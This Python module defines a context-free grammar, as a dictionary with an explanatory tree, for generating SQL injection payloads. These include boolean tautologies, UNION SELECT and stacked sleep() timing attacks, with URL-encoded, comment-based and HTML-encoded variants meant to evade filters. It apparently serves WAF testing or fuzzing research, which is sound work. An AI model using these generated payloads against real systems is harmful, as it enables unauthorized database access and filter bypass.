"""
grammar_definition.py
=====================
Defines the SQLi attack context-free grammar as a Python dictionary.
Imported by other modules — contains NO execution logic.

DATA STRUCTURE
--------------
GRAMMAR = {
    "ruleName": [ alternative1, alternative2, ... ]
}

Each alternative is a list of symbols:
  - str  matching a key in GRAMMAR  →  NON-TERMINAL  (recurse into it)
  - str  NOT matching any key       →  TERMINAL       (emit literally)
  - ("OPT", "ruleName")             →  OPTIONAL non-terminal   [rule]
  - ("OPT", ["sym1", "sym2", ...])  →  OPTIONAL sequence       [sym1, sym2]

VISUAL GRAMMAR TREE
-------------------
Reading guide:
  <RULE>           = non-terminal (defined elsewhere in this file)
  "literal"        = terminal     (emitted as-is into the attack string)
  [optional]       = 0 or 1 occurrences
  ALT1 | ALT2      = choose exactly one alternative
  sym1 , sym2      = concatenate in order

start
├── numericContext
│   ├── ALT1: "0" , <wsp> , <booleanAttack> , <wsp>
│   ├── ALT2: "0" , ")" , <wsp> , <booleanAttack> , <wsp> , <opOr> , "(" , "0"
│   └── ALT3: "0" , [")"] , <wsp> , <sqliAttack> , <cmt>
│
├── sQuoteContext
│   ├── ALT1: <terSQuote> , <wsp> , <booleanAttack> , <wsp> , <opOr> , <terSQuote>
│   ├── ALT2: <terSQuote> , ")" , <wsp> , <booleanAttack> , <wsp> , <opOr> , "(" , <terSQuote>
│   └── ALT3: <terSQuote> , [")"] , <wsp> , <sqliAttack> , <cmt>
│
└── dQuoteContext
    ├── ALT1: <terDQuote> , <wsp> , <booleanAttack> , <wsp> , <opOr> , <terDQuote>
    ├── ALT2: <terDQuote> , ")" , <wsp> , <booleanAttack> , <wsp> , <opOr> , "(" , <terDQuote>
    └── ALT3: <terDQuote> , [")"] , <wsp> , <sqliAttack> , <cmt>

─────────────────────────────────────────────────────────────────
sqliAttack
├── unionAttack
│   ├── ALT1: <union> , <wsp> , [<unionPostfix>] , "select" , <wsp> , <cols>
│   └── ALT2: <union> , <wsp> , [<unionPostfix>] , "(" , "select" , <wsp> , <cols> , ")"
│   │
│   ├── union
│   │   ├── ALT1: "union"
│   │   ├── ALT2: "/*!" , "union" , "*/"
│   │   └── ALT3: "/*!" , "50000" , "union" , "*/"
│   │
│   ├── unionPostfix  (optional)
│   │   ├── ALT1: "all"      , <wsp>
│   │   └── ALT2: "distinct" , <wsp>
│   │
│   └── cols → "0"
│
├── piggyAttack
│   └── ";" , "select" , <wsp> , <funcSleep>
│       └── funcSleep → "sleep" , "(" , <terDigitExcludingZero> , ")"
│           └── terDigitExcludingZero → "1"|"2"|"3"|"4"|"5"|"6"|"7"|"8"|"9"
│
└── booleanAttack
    ├── orAttack  → <opOr>  , <booleanTrueExpr>
    │   └── opOr → "or" | "||"
    │
    └── andAttack → <opAnd> , <booleanFalseExpr>
        └── opAnd → "and" | "&&"

─────────────────────────────────────────────────────────────────
booleanTrueExpr
├── unaryTrue
│   ├── ALT1: <wsp> , <trueAtom>
│   │         └── trueAtom → "true" | "1"
│   ├── ALT2: <wsp> , <opNot> , <wsp> , <falseAtom>
│   ├── ALT3: "~"  , <wsp> , <falseAtom>
│   └── ALT4: "~"  , <wsp> , <trueAtom>
│
└── binaryTrue
    ├── ALT1 : <unaryTrue>  "=" <wsp> "(" <unaryTrue>  ")"
    ├── ALT2 : <unaryFalse> "=" <wsp> "(" <unaryFalse> ")"
    ├── ALT3 : <terSQuote> "a" <terSQuote> "=" <terSQuote> "a" <terSQuote>
    ├── ALT4 : <terDQuote> "a" <terDQuote> "=" <terDQuote> "a" <terDQuote>
    ├── ALT5 : <unaryFalse> "<" "(" <unaryTrue>  ")"
    ├── ALT6 : <unaryTrue>  ">" "(" <unaryFalse> ")"
    ├── ALT7 : <wsp> <trueAtom> <wsp> "like" <wsp> <trueAtom>
    ├── ALT8 : <unaryTrue>  <wsp> "is" <wsp> "true"
    ├── ALT9 : <unaryFalse> <wsp> "is" <wsp> "false"
    └── ALT10: <unaryTrue>  "-"  "(" <unaryFalse> ")"

─────────────────────────────────────────────────────────────────
booleanFalseExpr → unaryFalse
    ├── ALT1: <falseAtom>
    │         ├── ALT1: <wsp> , "false"
    │         ├── ALT2: <wsp> , "0"
    │         └── ALT3: <terSQuote> , <terSQuote>    →  ''
    ├── ALT2: <wsp> , <opNot> , <wsp> , <trueAtom>
    └── ALT3: <wsp> , <opNot> , "~"  , <falseAtom>
        └── opNot → "!" | "not"

─────────────────────────────────────────────────────────────────
WHITESPACE & OBFUSCATION
    wsp
    ├── blank
    │   ├── " "    literal space
    │   ├── "+"    URL form-encoded space
    │   ├── "%20"  URL space
    │   ├── "%09"  URL tab
    │   ├── "%0a"  URL newline
    │   ├── "%0b"  URL vertical tab
    │   ├── "%0c"  URL form feed
    │   ├── "%0d"  URL carriage return
    │   └── "%a0"  URL non-breaking space
    └── inlineCmt → "/**/"

    cmt
    ├── "#"
    └── "--" , <blank>

─────────────────────────────────────────────────────────────────
QUOTE TERMINALS (with HTML / URL encoding variants)
    terSQuote → "'" | "&#39;" | "%27"
    terDQuote → '"' | "&#34;" | "&quot;" | "%22"
"""

# ---------------------------------------------------------------------------
# GRAMMAR DICTIONARY
# ---------------------------------------------------------------------------

GRAMMAR = {

    # ── Terminals / base tokens ────────────────────────────────────────────

    # Single quote + HTML / URL encoded equivalents
    "terSQuote": [
        ["'"],       # literal
        ["&#39;"],   # HTML decimal
        ["%27"],     # URL encoded
    ],

    # Double quote + HTML / URL encoded equivalents
    "terDQuote": [
        ['"'],       # literal
        ["&#34;"],   # HTML decimal
        ["&quot;"],  # HTML named entity
        ["%22"],     # URL encoded
    ],

    "terDigitZero":          [ ["0"] ],
    "terDigitOne":           [ ["1"] ],
    "terDigitExcludingZero": [ ["1"],["2"],["3"],["4"],
                               ["5"],["6"],["7"],["8"],["9"] ],
    "terChar":               [ ["a"] ],

    # ── SQL operators & keywords ───────────────────────────────────────────

    "opNot":      [ ["!"], ["not"] ],
    "opBinInvert":[ ["~"] ],
    "opEqual":    [ ["="] ],
    "opLt":       [ ["<"] ],
    "opGt":       [ [">"] ],
    "opLike":     [ ["like"] ],
    "opIs":       [ ["is"] ],
    "opMinus":    [ ["-"] ],
    "opOr":       [ ["or"], ["||"] ],
    "opAnd":      [ ["and"], ["&&"] ],
    "opSel":      [ ["select"] ],
    "opUni":      [ ["union"] ],
    "opSem":      [ [";"] ],

    # ── Syntax helpers ─────────────────────────────────────────────────────

    "parOpen":    [ ["("] ],
    "par":        [ [")"] ],

    # funcSleep = "sleep" "(" digit1-9 ")"
    "funcSleep": [ ["sleep", "parOpen", "terDigitExcludingZero", "par"] ],

    # ── Comments & obfuscation ─────────────────────────────────────────────

    # cmt = "#"  |  "--" blank
    "cmt": [ ["#"], ["--", "blank"] ],

    # inlineCmt is its own rule so it shows up as a distinct slice
    "inlineCmt": [ ["/**/"] ],

    # blank: all whitespace-equivalent obfuscation tokens
    "blank": [
        [" "],    # literal space
        ["+"],    # URL form-encoded space
        ["%20"],  # URL space
        ["%09"],  # URL tab
        ["%0a"],  # URL newline
        ["%0b"],  # URL vertical tab
        ["%0c"],  # URL form feed
        ["%0d"],  # URL carriage return
        ["%a0"],  # URL non-breaking space
    ],

    # wsp = blank | inlineCmt
    "wsp": [ ["blank"], ["inlineCmt"] ],

    # ── Boolean TRUE atoms ─────────────────────────────────────────────────

    "trueConst":  [ ["true"] ],
    "falseConst": [ ["false"] ],

    # trueAtom = "true" | "1"
    "trueAtom": [ ["trueConst"], ["terDigitOne"] ],

    # falseAtom = wsp "false"  |  wsp "0"  |  "''"
    "falseAtom": [
        ["wsp", "falseConst"],
        ["wsp", "terDigitZero"],
        ["terSQuote", "terSQuote"],
    ],

    # unaryTrue
    "unaryTrue": [
        ["wsp", "trueAtom"],
        ["wsp", "opNot", "wsp", "falseAtom"],
        ["opBinInvert", "wsp", "falseAtom"],
        ["opBinInvert", "wsp", "trueAtom"],
    ],

    # unaryFalse
    "unaryFalse": [
        ["falseAtom"],
        ["wsp", "opNot", "wsp", "trueAtom"],
        ["wsp", "opNot", "opBinInvert", "falseAtom"],
    ],

    # binaryTrue (10 alternatives — see tree comment above)
    "binaryTrue": [
        ["unaryTrue",  "opEqual", "wsp", "parOpen", "unaryTrue",  "par"],
        ["unaryFalse", "opEqual", "wsp", "parOpen", "unaryFalse", "par"],
        ["terSQuote", "terChar", "terSQuote", "opEqual",
         "terSQuote", "terChar", "terSQuote"],
        ["terDQuote", "terChar", "terDQuote", "opEqual",
         "terDQuote", "terChar", "terDQuote"],
        ["unaryFalse", "opLt",    "parOpen", "unaryTrue",  "par"],
        ["unaryTrue",  "opGt",    "parOpen", "unaryFalse", "par"],
        ["wsp", "trueAtom", "wsp", "opLike", "wsp", "trueAtom"],
        ["unaryTrue",  "wsp", "opIs", "wsp", "trueConst"],
        ["unaryFalse", "wsp", "opIs", "wsp", "falseConst"],
        ["unaryTrue",  "opMinus", "parOpen", "unaryFalse", "par"],
    ],

    # ── Boolean expressions ────────────────────────────────────────────────

    "booleanTrueExpr":  [ ["unaryTrue"], ["binaryTrue"] ],
    "booleanFalseExpr": [ ["unaryFalse"] ],

    "orAttack":      [ ["opOr",  "booleanTrueExpr"] ],
    "andAttack":     [ ["opAnd", "booleanFalseExpr"] ],
    "booleanAttack": [ ["orAttack"], ["andAttack"] ],

    # ── Union attacks ──────────────────────────────────────────────────────

    "cols": [ ["terDigitZero"] ],

    "unionPostfix": [ ["all", "wsp"], ["distinct", "wsp"] ],

    # union = "union"  |  "/*!" "union" "*/"  |  "/*!" "50000" "union" "*/"
    "union": [
        ["opUni"],
        ["/*!", "opUni", "*/"],
        ["/*!", "50000", "opUni", "*/"],
    ],

    "unionAttack": [
        ["union", "wsp", ("OPT", "unionPostfix"), "opSel", "wsp", "cols"],
        ["union", "wsp", ("OPT", "unionPostfix"), "parOpen",
         "opSel", "wsp", "cols", "par"],
    ],

    # ── Piggy-backed attacks ───────────────────────────────────────────────

    "piggyAttack": [ ["opSem", "opSel", "wsp", "funcSleep"] ],

    # ── Combined attack ────────────────────────────────────────────────────

    "sqliAttack": [
        ["unionAttack"],
        ["piggyAttack"],
        ["booleanAttack"],
    ],

    # ── Injection contexts ─────────────────────────────────────────────────

    "numericContext": [
        ["terDigitZero", "wsp", "booleanAttack", "wsp"],
        ["terDigitZero", "par", "wsp", "booleanAttack",
         "wsp", "opOr", "parOpen", "terDigitZero"],
        ["terDigitZero", ("OPT", "par"), "wsp", "sqliAttack", "cmt"],
    ],

    "sQuoteContext": [
        ["terSQuote", "wsp", "booleanAttack", "wsp", "opOr", "terSQuote"],
        ["terSQuote", "par", "wsp", "booleanAttack",
         "wsp", "opOr", "parOpen", "terSQuote"],
        ["terSQuote", ("OPT", "par"), "wsp", "sqliAttack", "cmt"],
    ],

    "dQuoteContext": [
        ["terDQuote", "wsp", "booleanAttack", "wsp", "opOr", "terDQuote"],
        ["terDQuote", "par", "wsp", "booleanAttack",
         "wsp", "opOr", "parOpen", "terDQuote"],
        ["terDQuote", ("OPT", "par"), "wsp", "sqliAttack", "cmt"],
    ],

    # ── Entry point ────────────────────────────────────────────────────────

    "start": [
        ["numericContext"],
        ["sQuoteContext"],
        ["dQuoteContext"],
    ],
}